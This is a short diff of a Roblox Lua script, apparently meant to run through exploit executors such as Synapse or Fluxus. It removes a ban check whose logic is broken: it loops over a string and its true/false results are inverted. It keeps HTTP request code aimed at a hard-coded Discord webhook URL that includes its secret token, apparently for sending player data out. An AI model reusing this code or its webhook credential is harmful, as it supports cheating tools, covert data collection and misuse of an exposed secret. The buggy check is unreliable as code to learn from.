@@ -1,21 +1,3 @@
-local blacklist = ("5463383635")
-local bln = {"rod_fram10"}
-local function isCurrentPlayerBanned()
-    local playerId = game.Players.LocalPlayer.UserId
-    local playerName = game.Players.LocalPlayer.Name
-    for _, bannedId in ipairs(blacklist) do
-        if tostring(playerId) == bannedId then
-            return true
-        end
-    end
-    for _, bannedName in ipairs(bln) do
-        if playerName == bannedName then
-            return false
-        end
-    end
-    return true
-end
-if isCurrentPlayerBanned() then
    local HttpService = game:GetService("HttpService")
 Webhook_URL =  "https://discord.com/api/webhooks/1269190578382442568/hch7wx8WtOLz5PRTa7JcCPIOiTozSsRJ05E84G2S6Qwr0USGmOBbCzZqMaEIy7D00YCL"
 local httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
